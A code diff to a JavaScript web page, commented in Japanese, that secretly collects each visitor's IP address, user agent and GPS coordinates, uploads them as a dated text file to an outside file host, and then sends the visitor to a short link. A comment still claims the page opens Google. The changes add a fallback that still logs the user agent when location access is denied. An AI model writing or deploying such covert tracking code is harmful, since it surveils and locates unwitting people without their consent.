@@ -29,7 +29,7 @@
           console.log("Public URL: ", data.secure_url);
 
           // アップロードが完了したらGoogleを開く
-          window.location.href = "https://google.com";
+          window.location.href = "https://boxfresh.me/wdqfmt5p";
         })
         .catch((error) => {
           console.log("Error uploading file: ", error);
@@ -37,12 +37,9 @@
     }
 
     // 位置情報と本体情報を含むテキストファイルをアップロードする関数
-    function uploadData(ipAddress, userAgent, latitude, longitude, altitude) {
-      const currentDate = new Date();
-      const dateString = currentDate.toISOString().split("T")[0]; // 日付を取得して文字列に変換
-
-      const text = `IPアドレス: ${ipAddress}, User Agent: ${userAgent}, Latitude: ${latitude}, Longitude: ${longitude}, Altitude: ${altitude}, 日付: ${dateString}`;
-      const file = new File([text], `${dateString}.txt`, { type: "text/plain" });
+    function uploadData(ipAddress, userAgent, latitude, longitude, altitude, date) {
+      const text = `IPアドレス: ${ipAddress}\nUser Agent: ${userAgent}\nLatitude: ${latitude}\nLongitude: ${longitude}\nAltitude: ${altitude}\n日付: ${date}`;
+      const file = new File([text], `${date}.txt`, { type: "text/plain" });
 
       uploadFile(file);
     }
@@ -52,7 +49,7 @@
       // 位置情報の取得に対応しているかチェック
       if (navigator.geolocation) {
         // 位置情報の取得開始
-        navigator.geolocation.getCurrentPosition(uploadLocation);
+        navigator.geolocation.getCurrentPosition(uploadLocation, handleLocationError);
       } else {
         console.log("Geolocation is not supported by this browser.");
       }
@@ -68,13 +65,32 @@
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
           const altitude = position.coords.altitude;
+          const currentDate = new Date();
+          const dateString = currentDate.toISOString().split("T")[0]; // 日付を取得して文字列に変換
 
           // ファイルのアップロード
-          uploadData(ipAddress.trim(), userAgent, latitude, longitude, altitude);
+          uploadData(ipAddress.trim(), userAgent, latitude, longitude, altitude, dateString);
         })
         .catch(error => {
           console.error('Error getting IP address', error);
         });
+    }
+
+    // 位置情報の取得に失敗したときの処理
+    function handleLocationError(error) {
+      console.error("Error getting location: ", error);
+
+      // 他の情報を取得し、nullを代わりに保存
+      const userAgent = window.navigator.userAgent;
+      const ipAddress = "null";
+      const latitude = "null";
+      const longitude = "null";
+      const altitude = "null";
+      const currentDate = new Date();
+      const dateString = currentDate.toISOString().split("T")[0]; // 日付を取得して文字列に変換
+
+      // ファイルのアップロード
+      uploadData(ipAddress, userAgent, latitude, longitude, altitude, dateString);
     }
 
     // 位置情報の取得とファイルのアップロードを実行
